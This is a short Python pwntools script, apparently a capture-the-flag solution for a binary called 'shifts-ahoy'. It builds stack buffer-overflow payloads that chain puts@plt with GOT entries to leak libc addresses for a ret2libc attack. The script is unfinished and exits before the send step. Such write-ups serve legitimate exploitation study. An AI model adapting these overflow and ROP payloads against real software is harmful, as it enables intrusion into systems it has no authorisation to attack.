# RazviOverflow
# Python3
# It seems to me like a straightforward ret2libc attack. 

from pwn import *
import sys

elf = ELF("shifts-ahoy")

plt_puts_address = p64(elf.plt[b'puts'])

got_puts_address = p64(elf.got[b'puts'])
got_printf_address = p64(elf.got[b'printf'])
got_fgets_address = p64(elf.got[b'fgets'])
got_atoi_address = p64(elf.got[b'atoi'])

encrypt_address = p64(elf.symbols[b'encrypt'])

#print(hex(u64(plt_puts_address)))
#print(hex(u64(got_puts_address)))
#print(hex(u64(got_printf_address)))
#print(hex(u64(got_fgets_address)))
#print(hex(u64(got_atoi_address)))
#print(hex(u64(encrypt_address)))

payload_puts = b"A" * 0x50 + b"B" * 0x8 + plt_puts_address + encrypt_address + got_puts_address
payload_printf = b"A" * 0x50 + b"B" * 0x8 + plt_puts_address + encrypt_address + got_printf_address
payload_fgets = b"A" * 0x50 + b"B" * 0x8 + plt_puts_address + encrypt_address + got_fgets_address
payload_atoi = b"A" * 0x50 + b"B" * 0x8 + plt_puts_address + encrypt_address + got_atoi_address

with open("input_file", "wb") as file:
	file.write(b"1\n")
	file.write(b"A" * 0x50 + b"B" * 0x8 + p64(0x00401280) + b"C"*0x8 + b"D"*0x08 + b"\n")
	file.write(b"E" * 0x50 + b"F" * 0x8 + encrypt_address + b"G"*0x8 + b"H"*0x08 + b"\n")
	file.write(b"I" * 0x50 + b"J" * 0x8 + encrypt_address + b"K"*0x8 + b"L"*0x08 + b"\n")

sys.exit()

binary = process("shifts-ahoy")
print(binary.recv())
binary.sendline("1")
print(binary.recv())
sleep(0.1)
binary.sendline(payload_puts)
print(binary.recvall())